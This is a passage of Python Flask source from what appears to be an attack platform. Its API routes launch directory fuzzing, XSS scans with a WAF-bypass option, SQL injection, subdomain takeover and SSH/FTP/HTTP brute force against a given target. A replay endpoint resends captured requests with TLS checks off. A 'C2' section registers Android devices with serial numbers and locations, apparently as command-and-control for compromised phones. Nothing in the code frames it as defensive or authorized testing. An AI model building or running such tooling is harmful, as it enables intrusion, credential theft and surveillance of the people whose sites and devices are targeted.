@login_required
def api_exploit_wordlists():
    if _dirfuzz_available and dirfuzz_module is not None:
        try:
            return jsonify({"directory": str(dirfuzz_module.WORDLIST_DIR),
                            "wordlists": dirfuzz_module.list_wordlists()})
        except Exception:
            pass
    return jsonify({"directory": str(WORDLIST_DIR), "wordlists": []})


# ═══════════════════════════════════════════════════════════════════════════
# DIRFUZZ
# ═══════════════════════════════════════════════════════════════════════════
def _dirfuzz_opts(body):
    def _i(k, d, lo, hi):
        try: return max(lo, min(hi, int(body.get(k, d))))
        except (TypeError, ValueError): return d
    def _f(k, d, lo, hi):
        try: return max(lo, min(hi, float(body.get(k, d))))
        except (TypeError, ValueError): return d
    def _b(k, d):
        v = body.get(k, d)
        return bool(v) if v is not None else d
    return {
        "wordlist_name": (body.get("wordlist_name") or "lottery-dirs.txt").strip(),
        "wordlist": body.get("wordlist") or None,
        "max_paths": _i("max_paths", 300, 10, 2000),
        "concurrency": _i("concurrency", 24, 1, 64),
        "rate_limit": _f("rate_limit", 40.0, 1.0, 200.0),
        "timeout": _f("timeout", 4.0, 1.0, 15.0),
        "max_duration": _f("max_duration", 90.0, 10.0, 300.0),
        "follow_redirects": _b("follow_redirects", False),
    }


@app.route("/api/exploit/dirfuzz/start", methods=["POST"])
@login_required
def api_dirfuzz_start():
    if not _dirfuzz_available or dirfuzz_module is None:
        return jsonify({"error": "dirfuzz_module_not_available"}), 503
    d = _json_body()
    base = (d.get("base") or d.get("url") or "").strip()
    if not base:
        return jsonify({"error": "base_url_required"}), 400
    if not job_manager.can_start("dirfuzz"):
        return jsonify({"error": "too_many_active_jobs",
                        "limit": job_manager.max_per_kind}), 429
    job_id = job_manager.new_id("DRF")
    opts = _dirfuzz_opts(d)
    job = _Job(job_id, "dirfuzz", base, opts)
    job_manager.register(job)

    def _cb(done, total, label):
        job_manager.update_progress(job_id, done, total, label)

    def _worker():
        try:
            r = dirfuzz_module.run(base, {**opts, "cancel_event": job.cancel,
                                            "progress_cb": _cb})
            job_manager.finish(job_id, results=r)
        except Exception as e:
            logger.exception("Dirfuzz job %s failed", job_id)
            job_manager.finish(job_id, error=str(e))

    threading.Thread(target=_worker, daemon=True,
                     name=f"drf-{job_id}").start()
    return jsonify({"job_id": job_id, "status": "running",
                    "options": opts}), 202


@app.route("/api/exploit/dirfuzz/status/<job_id>")
@login_required
def api_dirfuzz_status(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "dirfuzz":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job.to_public(include_results=True))


@app.route("/api/exploit/dirfuzz/cancel/<job_id>", methods=["POST"])
@login_required
def api_dirfuzz_cancel(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "dirfuzz":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job_manager.cancel(job_id))


@app.route("/api/exploit/dirfuzz/wordlists")
@login_required
def api_dirfuzz_wordlists():
    if not _dirfuzz_available or dirfuzz_module is None:
        return jsonify({"error": "dirfuzz_module_not_available"}), 503
    return jsonify({
        "wordlists": dirfuzz_module.list_wordlists(),
        "sources": getattr(dirfuzz_module, "WORDLIST_SOURCES", {}),
    })


@app.route("/api/exploit/dirfuzz/stream", methods=["POST"])
@login_required
def api_dirfuzz_stream():
    if not _dirfuzz_available or dirfuzz_module is None:
        return jsonify({"error": "dirfuzz_module_not_available"}), 503
    d = _json_body()
    base = (d.get("base") or d.get("url") or "").strip()
    if not base:
        return jsonify({"error": "base_url_required"}), 400
    return sse_response(dirfuzz_module.run_streaming(base, _dirfuzz_opts(d)))


# ═══════════════════════════════════════════════════════════════════════════
# XSS
# ═══════════════════════════════════════════════════════════════════════════
def _xss_opts(body):
    def _i(k, d, lo, hi):
        try: return max(lo, min(hi, int(body.get(k, d))))
        except (TypeError, ValueError): return d
    def _f(k, d, lo, hi):
        try: return max(lo, min(hi, float(body.get(k, d))))
        except (TypeError, ValueError): return d
    def _b(k, d):
        v = body.get(k, d)
        return bool(v) if v is not None else d
    return {
        "max_payloads": _i("max_payloads", 20, 5, 120),
        "max_params":   _i("max_params", 8, 3, 40),
        "concurrency":  _i("concurrency", 8, 1, 32),
        "rate_limit":   _f("rate_limit", 25.0, 1.0, 100.0),
        "timeout":      _f("timeout", 8.0, 2.0, 20.0),
        "waf_bypass":   _b("waf_bypass", False),
        "params":       body.get("params") or None,
        "method":       (body.get("method") or "GET").upper(),
        "max_duration": _f("max_duration", 60.0, 10.0, 180.0),
    }


@app.route("/api/exploit/xss/start", methods=["POST"])
@login_required
def api_xss_start():
    if not _xss_available or xss_module is None:
        return jsonify({"error": "xss_module_not_available"}), 503
    d = _json_body()
    url = (d.get("url") or "").strip()
    if not url:
        return jsonify({"error": "url_required"}), 400
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    if not job_manager.can_start("xss"):
        return jsonify({"error": "too_many_active_jobs",
                        "limit": job_manager.max_per_kind}), 429
    job_id = job_manager.new_id("XSS")
    opts = _xss_opts(d)
    job = _Job(job_id, "xss", url, opts)
    job_manager.register(job)

    def _cb(done, total, label):
        job_manager.update_progress(job_id, done, total, label)

    def _worker():
        try:
            r = xss_module.run(url, {**opts, "cancel_event": job.cancel,
                                       "progress_cb": _cb})
            job_manager.finish(job_id, results=r)
        except Exception as e:
            logger.exception("XSS job %s failed", job_id)
            job_manager.finish(job_id, error=str(e))

    threading.Thread(target=_worker, daemon=True,
                     name=f"xss-{job_id}").start()
    return jsonify({"job_id": job_id, "status": "running",
                    "options": opts}), 202


@app.route("/api/exploit/xss/status/<job_id>")
@login_required
def api_xss_status(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "xss":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job.to_public(include_results=True))


@app.route("/api/exploit/xss/cancel/<job_id>", methods=["POST"])
@login_required
def api_xss_cancel(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "xss":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job_manager.cancel(job_id))


@app.route("/api/exploit/xss/jobs")
@login_required
def api_xss_jobs():
    return jsonify({"jobs": [j.to_public()
                              for j in job_manager.list_by_kind("xss")]})


@app.route("/api/exploit/xss/stream", methods=["POST"])
@login_required
def api_xss_stream():
    if not _xss_available or xss_module is None:
        return jsonify({"error": "xss_module_not_available"}), 503
    if not hasattr(xss_module, "run_streaming"):
        return jsonify({"error": "stream_not_supported"}), 501
    d = _json_body()
    url = (d.get("url") or "").strip()
    if not url:
        return jsonify({"error": "url_required"}), 400
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return sse_response(xss_module.run_streaming(url, _xss_opts(d)))


@app.route("/api/exploit/xss", methods=["POST"])
@login_required
def api_xss_legacy():
    if not _xss_available or xss_module is None:
        return jsonify({"error": "xss_module_not_available"}), 503
    d = _json_body()
    url = (d.get("url") or "").strip()
    if not url:
        return jsonify({"error": "url_required"}), 400
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    try:
        return jsonify({"results": xss_module.run(url, _xss_opts(d))})
    except Exception as e:
        logger.exception("XSS failed")
        return jsonify({"error": "scan_failed", "detail": str(e)}), 500


@app.route("/api/exploit/xss/wordlist")
@login_required
def api_xss_wordlist():
    if not _xss_available:
        return jsonify({"error": "unavailable"}), 503
    try:
        return jsonify(xss_module.ensure_wordlist())
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/xss/wordlist/preview")
@login_required
def api_xss_wordlist_preview():
    if not _xss_available:
        return jsonify({"error": "unavailable"}), 503
    try:
        limit = min(int(request.args.get("lines", 50)), 500)
        pl = xss_module.load_wordlist()
        return jsonify({"count": len(pl), "lines": pl[:limit]})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/xss/wordlist/refresh", methods=["POST"])
@login_required
def api_xss_wordlist_refresh():
    if not _xss_available:
        return jsonify({"error": "unavailable"}), 503
    try:
        pl = xss_module.load_wordlist(force_download=True)
        return jsonify({"success": True, "count": len(pl)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# SQLi
# ═══════════════════════════════════════════════════════════════════════════
def _sqli_opts(body):
    def _i(k, d, lo, hi):
        try: return max(lo, min(hi, int(body.get(k, d))))
        except (TypeError, ValueError): return d
    def _f(k, d, lo, hi):
        try: return max(lo, min(hi, float(body.get(k, d))))
        except (TypeError, ValueError): return d

    techs = body.get("techniques") or ["error", "boolean", "time", "union"]
    if not isinstance(techs, list):
        techs = ["error", "boolean", "time", "union"]
    techs = [t for t in techs
             if t in ("error", "boolean", "time", "union")][:4] or \
            ["error", "boolean", "time"]
    return {
        "techniques":   techs,
        "params":       body.get("params") or None,
        "max_params":   _i("max_params", 10, 1, 40),
        "concurrency":  _i("concurrency", 8, 1, 16),
        "rate_limit":   _f("rate_limit", 20.0, 1.0, 100.0),
        "timeout":      _f("timeout", 8.0, 2.0, 30.0),
        "max_duration": _f("max_duration", 90.0, 10.0, 300.0),
        "method":       (body.get("method") or "GET").upper(),
        "headers":      body.get("headers") or None,
        "cookies":      body.get("cookies") or None,
    }


@app.route("/api/exploit/sqli/start", methods=["POST"])
@login_required
def api_sqli_start():
    if not _sqli_available or sqli_module is None:
        return jsonify({"error": "sqli_module_not_available"}), 503
    d = _json_body()
    url = (d.get("url") or "").strip()
    if not url:
        return jsonify({"error": "url_required"}), 400
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    if not job_manager.can_start("sqli"):
        return jsonify({"error": "too_many_active_jobs",
                        "limit": job_manager.max_per_kind}), 429
    job_id = job_manager.new_id("SQL")
    opts = _sqli_opts(d)
    job = _Job(job_id, "sqli", url, opts)
    job_manager.register(job)

    def _cb(done, total, label):
        job_manager.update_progress(job_id, done, total, label)

    def _worker():
        try:
            r = sqli_module.run(url, {**opts, "cancel_event": job.cancel,
                                        "progress_cb": _cb})
            job_manager.finish(job_id, results=r)
        except Exception as e:
            logger.exception("SQLi job %s failed", job_id)
            job_manager.finish(job_id, error=str(e))

    threading.Thread(target=_worker, daemon=True,
                     name=f"sqli-{job_id}").start()
    return jsonify({"job_id": job_id, "status": "running",
                    "options": opts}), 202


@app.route("/api/exploit/sqli/status/<job_id>")
@login_required
def api_sqli_status(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "sqli":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job.to_public(include_results=True))


@app.route("/api/exploit/sqli/cancel/<job_id>", methods=["POST"])
@login_required
def api_sqli_cancel(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "sqli":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job_manager.cancel(job_id))


@app.route("/api/exploit/sqli/jobs")
@login_required
def api_sqli_jobs():
    return jsonify({"jobs": [j.to_public()
                              for j in job_manager.list_by_kind("sqli")]})


@app.route("/api/exploit/sqli/stream", methods=["POST"])
@login_required
def api_sqli_stream():
    if not _sqli_available or sqli_module is None:
        return jsonify({"error": "sqli_module_not_available"}), 503
    if not hasattr(sqli_module, "run_streaming"):
        return jsonify({"error": "stream_not_supported"}), 501
    d = _json_body()
    url = (d.get("url") or "").strip()
    if not url:
        return jsonify({"error": "url_required"}), 400
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return sse_response(sqli_module.run_streaming(url, _sqli_opts(d)))


@app.route("/api/exploit/sqli/wordlists")
@login_required
def api_sqli_wordlists():
    if not _sqli_available or sqli_module is None:
        return jsonify({"error": "sqli_module_not_available"}), 503
    try:
        return jsonify(sqli_module.ensure_wordlists())
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/sql_inject", methods=["POST"])
@login_required
def api_sql_inject_legacy():
    d = _json_body()
    url = (d.get("url") or "").strip()
    if not url:
        return jsonify({"error": "url_required"}), 400
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    if _sqli_available and sqli_module is not None:
        try:
            return jsonify({"results": sqli_module.run(url, _sqli_opts(d))})
        except Exception as e:
            logger.exception("SQLi failed")
            return jsonify({"error": "scan_failed", "detail": str(e)}), 500
    if _analytic_available and AnalyticDataManager is not None:
        try:
            return jsonify({"results": AnalyticDataManager().run_sql_injection_scan(
                url, d.get("method", "GET"), d.get("params"))})
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"error": "no_sqli_engine"}), 503


# ═══════════════════════════════════════════════════════════════════════════
# SUBDOMAIN TAKEOVER
# ═══════════════════════════════════════════════════════════════════════════
def _takeover_opts(body):
    def _i(k, d, lo, hi):
        try: return max(lo, min(hi, int(body.get(k, d))))
        except (TypeError, ValueError): return d
    def _f(k, d, lo, hi):
        try: return max(lo, min(hi, float(body.get(k, d))))
        except (TypeError, ValueError): return d
    def _b(k, d):
        v = body.get(k, d)
        return bool(v) if v is not None else d
    return {
        "enumerate":    _b("enumerate", True),
        "use_crtsh":    _b("use_crtsh", True),
        "use_wordlist": _b("use_wordlist", True),
        "use_passive":  _b("use_passive", True),
        "concurrency":  _i("concurrency", 24, 1, 64),
        "max_hosts":    _i("max_hosts", 150, 10, 500),
        "http_timeout": _f("http_timeout", 5.0, 1.0, 15.0),
        "dns_timeout":  _f("dns_timeout", 2.5, 0.5, 10.0),
        "rate_limit":   _f("rate_limit", 25.0, 1.0, 100.0),
        "max_duration": _f("max_duration", 90.0, 10.0, 300.0),
    }


@app.route("/api/exploit/takeover/start", methods=["POST"])
@login_required
def api_takeover_start():
    if not _takeover_available or takeover_module is None:
        return jsonify({"error": "takeover_module_not_available"}), 503
    d = _json_body()
    domain = (d.get("domain") or "").strip().lower()
    if not domain:
        return jsonify({"error": "domain_required"}), 400
    if not re.match(r"^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?"
                    r"(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$", domain):
        return jsonify({"error": "invalid_domain_format"}), 400
    if not job_manager.can_start("takeover"):
        return jsonify({"error": "too_many_active_jobs",
                        "limit": job_manager.max_per_kind}), 429
    job_id = job_manager.new_id("TKO")
    opts = _takeover_opts(d)
    job = _Job(job_id, "takeover", domain, opts)
    job_manager.register(job)

    def _cb(done, total, label):
        job_manager.update_progress(job_id, done, total, label)

    def _worker():
        try:
            r = takeover_module.run(domain, {**opts, "cancel_event": job.cancel,
                                              "progress_cb": _cb})
            job_manager.finish(job_id, results=r)
        except Exception as e:
            logger.exception("Takeover job %s failed", job_id)
            job_manager.finish(job_id, error=str(e))

    threading.Thread(target=_worker, daemon=True,
                     name=f"tk-{job_id}").start()
    return jsonify({"job_id": job_id, "status": "running",
                    "options": opts}), 202


@app.route("/api/exploit/takeover/status/<job_id>")
@login_required
def api_takeover_status(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "takeover":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job.to_public(include_results=True))


@app.route("/api/exploit/takeover/cancel/<job_id>", methods=["POST"])
@login_required
def api_takeover_cancel(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "takeover":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job_manager.cancel(job_id))


@app.route("/api/exploit/takeover/jobs")
@login_required
def api_takeover_jobs():
    return jsonify({"jobs": [j.to_public()
                              for j in job_manager.list_by_kind("takeover")]})


@app.route("/api/exploit/takeover/stream", methods=["POST"])
@login_required
def api_takeover_stream():
    if not _takeover_available or takeover_module is None:
        return jsonify({"error": "takeover_module_not_available"}), 503
    if not hasattr(takeover_module, "run_streaming"):
        return jsonify({"error": "stream_not_supported"}), 501
    d = _json_body()
    domain = (d.get("domain") or "").strip().lower()
    if not domain:
        return jsonify({"error": "domain_required"}), 400
    return sse_response(takeover_module.run_streaming(domain, _takeover_opts(d)))


@app.route("/api/exploit/takeover", methods=["POST"])
@login_required
def api_takeover_legacy():
    if not _takeover_available or takeover_module is None:
        return jsonify({"error": "takeover_module_not_available"}), 503
    d = _json_body()
    domain = (d.get("domain") or "").strip().lower()
    if not domain:
        return jsonify({"error": "domain_required"}), 400
    try:
        return jsonify(takeover_module.run(domain, _takeover_opts(d)))
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        logger.exception("Takeover failed")
        return jsonify({"error": "scan_failed", "detail": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# SNIPER
# ═══════════════════════════════════════════════════════════════════════════
def _sniper_opts(body):
    def _i(k, d, lo, hi):
        try: return max(lo, min(hi, int(body.get(k, d))))
        except (TypeError, ValueError): return d
    def _f(k, d, lo, hi):
        try: return max(lo, min(hi, float(body.get(k, d))))
        except (TypeError, ValueError): return d
    def _b(k, d):
        v = body.get(k, d)
        return bool(v) if v is not None else d
    return {
        "module_timeout": _f("module_timeout", 90.0, 15.0, 300.0),
        "global_budget":  _f("global_budget", 150.0, 20.0, 600.0),
        "sqli_techniques": body.get("sqli_techniques") or None,
        "sqli_max_params": _i("sqli_max_params", 10, 1, 40),
        "sqli_rate_limit": _f("sqli_rate_limit", 20.0, 1.0, 100.0),
        "sqli_max_duration": _f("sqli_max_duration", 60.0, 10.0, 180.0),
        "dirfuzz_wordlist": (body.get("dirfuzz_wordlist") or "lottery-dirs.txt").strip(),
        "dirfuzz_max_paths": _i("dirfuzz_max_paths", 80, 10, 500),
        "dirfuzz_concurrency": _i("dirfuzz_concurrency", 24, 1, 64),
        "dirfuzz_rate_limit": _f("dirfuzz_rate_limit", 40.0, 1.0, 200.0),
        "dirfuzz_timeout": _f("dirfuzz_timeout", 4.0, 1.0, 15.0),
        "dirfuzz_max_duration": _f("dirfuzz_max_duration", 60.0, 10.0, 180.0),
        "xss_max_payloads": _i("xss_max_payloads", 20, 5, 120),
        "xss_max_params":   _i("xss_max_params", 8, 3, 40),
        "xss_concurrency":  _i("xss_concurrency", 8, 1, 32),
        "xss_rate_limit":   _f("xss_rate_limit", 25.0, 1.0, 100.0),
        "xss_timeout":      _f("xss_timeout", 8.0, 2.0, 20.0),
        "xss_waf_bypass":   _b("xss_waf_bypass", False),
        "xss_max_duration": _f("xss_max_duration", 60.0, 10.0, 180.0),
        "takeover_enumerate":    _b("takeover_enumerate", True),
        "takeover_crtsh":        _b("takeover_crtsh", True),
        "takeover_wordlist":     _b("takeover_wordlist", True),
        "takeover_concurrency":  _i("takeover_concurrency", 24, 1, 100),
        "takeover_max_hosts":    _i("takeover_max_hosts", 120, 10, 500),
        "takeover_rate_limit":   _f("takeover_rate_limit", 25.0, 1.0, 100.0),
        "takeover_http_timeout": _f("takeover_http_timeout", 5.0, 2.0, 20.0),
        "takeover_dns_timeout":  _f("takeover_dns_timeout", 2.5, 0.5, 10.0),
        "takeover_max_duration": _f("takeover_max_duration", 75.0, 10.0, 180.0),
    }


@app.route("/api/exploit/sniper/start", methods=["POST"])
@login_required
def api_sniper_start():
    if not _sniper_available or sniper_module is None:
        return jsonify({"error": "sniper_module_not_available"}), 503
    d = _json_body()
    target = (d.get("target") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400
    if not re.match(
        r"^(https?://)?[A-Za-z0-9]([A-Za-z0-9\-]{0,61}[A-Za-z0-9])?"
        r"(\.[A-Za-z0-9]([A-Za-z0-9\-]{0,61}[A-Za-z0-9])?)*"
        r"(:\d{1,5})?(/[^\s]*)?$", target):
        return jsonify({"error": "invalid_target_format"}), 400
    if not job_manager.can_start("sniper"):
        return jsonify({"error": "too_many_active_jobs",
                        "limit": job_manager.max_per_kind}), 429
    job_id = job_manager.new_id("SNP")
    opts = _sniper_opts(d)
    job = _Job(job_id, "sniper", target, opts)
    job_manager.register(job)

    def _worker():
        try:
            r = sniper_module.run(target, {**opts, "cancel_event": job.cancel})
            job_manager.finish(job_id, results=r)
        except Exception as e:
            logger.exception("Sniper job %s failed", job_id)
            job_manager.finish(job_id, error=str(e))

    threading.Thread(target=_worker, daemon=True,
                     name=f"snp-{job_id}").start()
    return jsonify({"job_id": job_id, "status": "running",
                    "options": opts}), 202


@app.route("/api/exploit/sniper/status/<job_id>")
@login_required
def api_sniper_status(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "sniper":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job.to_public(include_results=True))


@app.route("/api/exploit/sniper/cancel/<job_id>", methods=["POST"])
@login_required
def api_sniper_cancel(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "sniper":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job_manager.cancel(job_id))


@app.route("/api/exploit/sniper/jobs")
@login_required
def api_sniper_jobs():
    return jsonify({"jobs": [j.to_public()
                              for j in job_manager.list_by_kind("sniper")]})


@app.route("/api/exploit/sniper/stream", methods=["POST"])
@login_required
def api_sniper_stream():
    if not _sniper_available or sniper_module is None:
        return jsonify({"error": "sniper_module_not_available"}), 503
    if not hasattr(sniper_module, "run_streaming"):
        return jsonify({"error": "stream_not_supported"}), 501
    d = _json_body()
    target = (d.get("target") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400
    return sse_response(sniper_module.run_streaming(target, _sniper_opts(d)))


@app.route("/api/exploit/sniper", methods=["POST"])
@login_required
def api_sniper_legacy():
    if not _sniper_available or sniper_module is None:
        return jsonify({"error": "sniper_module_not_available"}), 503
    d = _json_body()
    target = (d.get("target") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400
    try:
        return jsonify(sniper_module.run(target, _sniper_opts(d)))
    except Exception as e:
        logger.exception("Sniper failed")
        return jsonify({"error": "scan_failed", "detail": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# EXPLOIT SEARCH / STATS / BRUTE FORCE
# ═══════════════════════════════════════════════════════════════════════════
def _require_analytic():
    return (None if _analytic_available
            else (jsonify({"error": "analytic_module_not_available"}), 503))


@app.route("/api/exploit/stats")
@login_required
def api_exploit_stats():
    g_ = _require_analytic()
    if g_: return g_
    try:
        return jsonify(AnalyticDataManager().get_statistics())
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/list")
@login_required
def api_exploit_list():
    g_ = _require_analytic()
    if g_: return g_
    try:
        return jsonify({"exploits": AnalyticDataManager().list_exploits(
            category=request.args.get("category"),
            service=request.args.get("service"))})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/search", methods=["POST"])
@login_required
def api_exploit_search():
    g_ = _require_analytic()
    if g_: return g_
    q = _json_body().get("query", "")
    if not q:
        return jsonify({"error": "query_required"}), 400
    try:
        return jsonify({"exploits": AnalyticDataManager().search_exploits(q)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/bruteforce", methods=["POST"])
@login_required
def api_exploit_bruteforce():
    g_ = _require_analytic()
    if g_: return g_
    d = _json_body()
    target = (d.get("target") or "").strip()
    if not target:
        return jsonify({"error": "target_required"}), 400
    try:
        return jsonify({"results": AnalyticDataManager().run_brute_force(
            target, d.get("protocols", ["http", "ftp", "ssh"]),
            d.get("username_file", "data1.txt"),
            d.get("password_file", "data1.txt"))})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/bruteforce/stop", methods=["POST"])
@login_required
def api_exploit_bruteforce_stop():
    g_ = _require_analytic()
    if g_: return g_
    try:
        AnalyticDataManager().stop_brute_force()
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# HTTP LOGGER
# ═══════════════════════════════════════════════════════════════════════════
def _require_logger():
    return (None if http_logger is not None
            else (jsonify({"error": "http_logger_not_available"}), 503))


@app.route("/api/logger/requests")
@login_required
def api_logger_requests():
    g_ = _require_logger()
    if g_: return g_
    try:
        page = int(request.args.get("page", 1))
        size = int(request.args.get("size", 100))
        smin = request.args.get("status_min", type=int)
        smax = request.args.get("status_max", type=int)
        since = request.args.get("since_ms", type=int)
    except (TypeError, ValueError):
        return jsonify({"error": "invalid_query_params"}), 400
    return jsonify(http_logger.list(
        page=page, size=size, q=request.args.get("q"),
        method=request.args.get("method"),
        status_min=smin, status_max=smax,
        anomaly=request.args.get("anomaly"), tag=request.args.get("tag"),
        ip=request.args.get("ip"), since_ms=since))


@app.route("/api/logger/requests/<entry_id>")
@login_required
def api_logger_detail(entry_id):
    g_ = _require_logger()
    if g_: return g_
    e = http_logger.get(entry_id)
    return jsonify(e) if e else (jsonify({"error": "not_found"}), 404)


@app.route("/api/logger/requests", methods=["DELETE"])
@login_required
def api_logger_clear():
    g_ = _require_logger()
    if g_: return g_
    return jsonify({"success": True, "cleared": http_logger.clear()})


@app.route("/api/logger/requests/<entry_id>/tag", methods=["POST"])
@login_required
def api_logger_tag(entry_id):
    g_ = _require_logger()
    if g_: return g_
    d = _json_body()
    tag = (d.get("tag") or "").strip()
    if not tag:
        return jsonify({"error": "tag_required"}), 400
    return (jsonify({"success": True})
            if http_logger.tag(entry_id, tag, add=bool(d.get("add", True)))
            else (jsonify({"error": "not_found"}), 404))


@app.route("/api/logger/stats")
@login_required
def api_logger_stats():
    g_ = _require_logger()
    if g_: return g_
    return jsonify(http_logger.stats())


@app.route("/api/logger/export")
@login_required
def api_logger_export():
    g_ = _require_logger()
    if g_: return g_
    fmt = (request.args.get("format") or "har").lower()
    res = http_logger.list(page=1, size=500,
                            q=request.args.get("q"),
                            method=request.args.get("method"),
                            since_ms=request.args.get("since_ms", type=int))
    items = res.get("items") or []
    if fmt == "har":
        payload = json.dumps(http_logger.to_har(items),
                              ensure_ascii=False, indent=2)
        fname = f"http-logger-{int(time.time())}.har"
        mt = "application/json"
    elif fmt == "json":
        payload = json.dumps({"entries": items}, ensure_ascii=False, indent=2)
        fname = f"http-logger-{int(time.time())}.json"
        mt = "application/json"
    elif fmt == "jsonl":
        payload = "\n".join(json.dumps(e, ensure_ascii=False) for e in items)
        fname = f"http-logger-{int(time.time())}.jsonl"
        mt = "application/x-ndjson"
    else:
        return jsonify({"error": f"unsupported_format: {fmt}"}), 400
    return Response(payload, mimetype=mt,
                    headers={"Content-Disposition":
                             f'attachment; filename="{fname}"'})


@app.route("/api/logger/stream")
@login_required
def api_logger_stream():
    g_ = _require_logger()
    if g_: return g_
    subscriber = http_logger.subscribe()

    def _gen():
        try:
            yield ": connected\n\n"
            last = time.time()
            while True:
                try:
                    ev = subscriber.get(timeout=10)
                    yield f"data: {json.dumps(ev, ensure_ascii=False)}\n\n"
                    last = time.time()
                except QueueEmpty:
                    if time.time() - last > 10:
                        yield ": ping\n\n"
                        last = time.time()
        except GeneratorExit:
            pass
        finally:
            http_logger.unsubscribe(subscriber)

    return Response(stream_with_context(_gen()),
                    mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache, no-transform",
                             "X-Accel-Buffering": "no",
                             "Connection": "keep-alive"})


@app.route("/api/logger/replay/<entry_id>", methods=["POST"])
@login_required
def api_logger_replay(entry_id):
    g_ = _require_logger()
    if g_: return g_
    e = http_logger.get(entry_id)
    if not e:
        return jsonify({"error": "not_found"}), 404
    d = _json_body()
    headers = e.get("headers") or {}
    host = (d.get("override_host") or "").strip() or headers.get("Host", "")
    if not host:
        return jsonify({"error": "no_target_host"}), 400
    scheme = e.get("scheme") or "http"
    path = e.get("path") or "/"
    query = e.get("query") or ""
    url = f"{scheme}://{host}{path}" + (f"?{query}" if query else "")
    safe_h = {k: v for k, v in headers.items()
              if k.lower() not in ("host", "content-length", "connection",
                                    "transfer-encoding")}
    safe_h["User-Agent"] = "Emergens-Replay/1.0"
    method = e.get("method", "GET")
    body = e.get("body_preview") if method not in ("GET", "HEAD") else None
    try:
        r = requests.request(method, url, headers=safe_h, data=body,
                             timeout=15, allow_redirects=False, verify=False)
        return jsonify({"success": True, "url": url, "method": method,
                        "status": r.status_code,
                        "elapsed_ms": round(r.elapsed.total_seconds() * 1000, 1),
                        "response_headers": dict(r.headers),
                        "body_preview": r.text[:2000]})
    except requests.exceptions.RequestException as e:
        return jsonify({"success": False, "error": str(e), "url": url}), 502


# ═══════════════════════════════════════════════════════════════════════════
# C2
# ═══════════════════════════════════════════════════════════════════════════
_lock_state = {"locked": True, "locked_by": None, "locked_at": None}
_c2_devices: List[Dict[str, Any]] = []
_c2_activities: List[Dict[str, Any]] = []
_c2_lock = threading.Lock()


@app.route("/api/c2/status")
@login_required
def c2_status():
    return jsonify({"authenticated": True,
                    "username": session.get("username"),
                    "role": session.get("role"),
                    "lock_state": _lock_state})


@app.route("/api/c2/toggle_lock", methods=["POST"])
@login_required
def c2_toggle_lock():
    with _c2_lock:
        _lock_state["locked"] = not _lock_state["locked"]
        if _lock_state["locked"]:
            _lock_state["locked_by"] = session.get("username")
            _lock_state["locked_at"] = _now_iso()
        else:
            _lock_state["locked_by"] = None
            _lock_state["locked_at"] = None
        return jsonify({"success": True, "lock_state": _lock_state})


@app.route("/api/c2/devices")
@login_required
def c2_devices():
    return jsonify({"devices": _c2_devices})


@app.route("/api/c2/activities")
@login_required
def c2_activities():
    try:
        n = min(int(request.args.get("limit", 50)), 200)
    except (TypeError, ValueError):
        n = 50
    return jsonify({"activities": _c2_activities[-n:]})


@app.route("/api/c2/register_device", methods=["POST"])
@login_required
def c2_register_device():
    d = _json_body()
    device_id = (d.get("id") or "").strip()
    if not device_id:
        return jsonify({"error": "device_id_required"}), 400
    device = {
        "id": device_id,
        "name": d.get("name", device_id),
        "model": d.get("model", ""),
        "serial": d.get("serial", ""),
        "android": d.get("android", ""),
        "status": "online",
        "battery": d.get("battery"),
        "location": d.get("location", ""),
        "temperature": d.get("temperature", ""),
        "last_seen": _now_iso(),
    }
    with _c2_lock:
        for i, existing in enumerate(_c2_devices):
            if existing["id"] == device_id:
                _c2_devices[i] = device
                break
        else:
            _c2_devices.append(device)
    return jsonify({"success": True, "device": device})


@app.route("/api/c2/log_activity", methods=["POST"])
@login_required
def c2_log_activity():
    d = _json_body()
    device_id = (d.get("device_id") or "").strip()
    action = (d.get("action") or "").strip()
